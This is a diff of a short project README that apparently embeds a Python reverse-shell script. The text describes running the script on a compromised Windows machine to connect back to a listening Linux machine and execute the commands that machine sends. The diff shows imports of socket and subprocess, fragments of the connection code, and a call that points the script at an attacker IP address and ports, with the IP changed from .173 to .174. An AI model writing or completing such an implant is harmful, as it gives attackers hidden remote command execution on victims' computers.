@@ -1,5 +1,7 @@
 # PythonScriptProject4
 On a compromised window machine we have a python script that connects to a listening port on a linux machine. This python script will execute a command specified by our linux machine.
+
+
 import time
 import socket
 import subprocess
@@ -62,4 +64,4 @@ def main(dat): #calls main with argument which is tuple
    
       s.close()
 
-main(('192.168.4.173',[432,34395]))
+main(('192.168.4.174',[432,34395]))
